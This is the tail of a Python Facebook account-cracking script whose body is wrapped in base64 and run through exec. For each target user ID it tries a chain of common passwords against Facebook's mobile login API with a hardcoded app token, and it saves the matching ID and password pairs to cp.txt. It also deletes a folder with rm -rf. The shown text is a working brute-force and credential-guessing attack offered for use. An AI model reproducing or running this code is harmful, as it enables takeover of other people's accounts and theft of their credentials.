			              q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			              d=json.loads(q)   
			              if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                 print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                 cp=open("cp.txt","a")
			                 cp.write(uid+" | "+passpak+"\n")
			                 cp.close()                 
			              else:
			              
			                 passpak=name+"1234"
			                 q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                 d=json.loads(q)   
			                 if 'www.facebook.com' in d['error_msg']:
			                  print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                  cp=open("cp.txt","a")
			                  cp.write(uid+" | "+passpak+"\n")
			                  cp.close()                 
			                 else:
			                  passpak=name+"12345"
			                  q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                  d=json.loads(q)   
			                  if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                   print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                   cp=open("cp.txt","a")
			                   cp.write(uid+" | "+passpak+"\n")          
			                   cp.close()                   
			                  else:
			                   passpak=name+"786"
			                  q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                  d=json.loads(q)   
			                  if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                   print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                   cp=open("cp.txt","a")
			                   cp.write(uid+" | "+passpak+"\n")        
			                   cp.close()                  
			                  else:
			                   passpak="12345678"
			                   q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                   d=json.loads(q)   
			                   if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                    print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                    cp=open("cp.txt","a")
			                    cp.write(uid+" | "+passpak+"\n")               
			                    cp.close()        
			                   else:
			                    passpak="1122334455"
			                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                    d=json.loads(q)   
			                    if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                     print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                     cp=open("cp.txt","a")
			                     cp.write(uid+" | "+passpak+"\n")                  
			                     cp.close()
			                    else:
			                      passpak="786786"
			                      q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                      d=json.loads(q)   
			                      if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                       print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                       cp=open("cp.txt","a")
			                       cp.write(uid+" | "+passpak+"\n")           
			                       cp.close()
			                      else:
			                        passpak="123456"
			                        q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                        d=json.loads(q)   
			                        if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                         print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                         cp=open("cp.txt","a")    
			                         cp.write(uid+" | "+passpak+"\n")                         
			                         cp.close()
			                        else:
			                          passpak="8090100"
			                          q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + passpak + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
			                          d=json.loads(q)   
			                          if 'www.facebook.com' in d['error_msg'] or 'access_token' in d:
			                           print("\033[1;94m[\033[1;97mCP\033[1;94m]\033[1;97m "+uid+"\033[1;91m-⋄-\033[1;97m"+passpak+"\033[1;91m-⋄-\033[1;97m"+allname)
			                           cp=open("cp.txt","a")
			                           cp.write(uid+" | "+passpak+"\n")                         
			                           cp.close()
  
       except KeyError:
          print("not crack")
    if(notfound==1):
     notfound=0       
    else:
     if(len(lenth)==1): 
      
      p1=Process(target=pascrack1)
      p1.start()
     else:
      p2=Process(target=pascrack2)
      p2.start()
 p3=Process(target=readlist)
 p3.start()



     


main2()
os.system('rm -rf adv')


if __name__ == '__main__':
 os.system('rm -rf adv')
 exit()

'
exec(base64.b64decode(a))
